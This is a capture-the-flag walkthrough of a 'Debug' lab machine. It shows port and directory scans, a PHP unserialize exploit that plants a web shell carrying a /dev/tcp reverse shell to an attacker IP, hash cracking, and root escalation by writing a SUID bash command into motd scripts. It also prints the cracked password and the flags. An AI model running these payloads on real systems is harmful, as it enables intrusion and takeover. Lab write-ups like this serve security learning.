> Debug

# Rustscan

rustscan -a $IP --ulimit=5000 -b 4500 -- -sC -sV -Pn -A | tee rustscan.log


```
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,sql,bak,zip,bin,tar,js

```
/index.php (Status: 200)
/javascript (Status: 301)
/message.txt (Status: 200)
/backup (Status: 301)
/grid (Status: 301)
```

## message.txt

```
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
```

## /backup

We got 2 interesting backup files `index.html.bak` and `index.php.bak`. Inspecting .php files shows us an interesting information!!🚑

```
// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();
```

Here is a class called FormSubmit with a `__destruct` function implemented. This function is what we can use to get RCE. The function uses `file_put_contents` to write the variable message to the file defined in the variable `form_file`. If we go over to the URI IP/message.txt and we got some 200 respond which is success.

## Payload

```
php -a
class FormSubmit {
  public $form_file = 'shell.php';
  public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.8.107.21/1234 0>&1\'"); ?>';
  }

print urlencode(serialize(new FormSubmit));
```

And we can curl the payload. `curl -i $IP/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.8.107.21%2F1234+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D`

Let's curl `curl $IP/shell.php` and we got a reverse shell!!! We got a .htpasswd file in www-data.

## .htpasswd 

```
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

# Cracking using hashcat

hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt

```
jamaica
```

# user.txt

```
7e37c84a66cc40b1c6bf700d08d28c20
```

# Priv-Esc

## Note-To-James.txt 

```
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

So, we have to edit `/etc/update-motd.d`. We have all access to those files.

# Exploit

```
echo "cp /bin/bash /home/james/bash && chmod u+s /home/james/bash" >> 00-header
# Log out and login again
./bash -p
```

# root.txt

```
3c8c3d0fe758c320d158e32f68fabf4b
```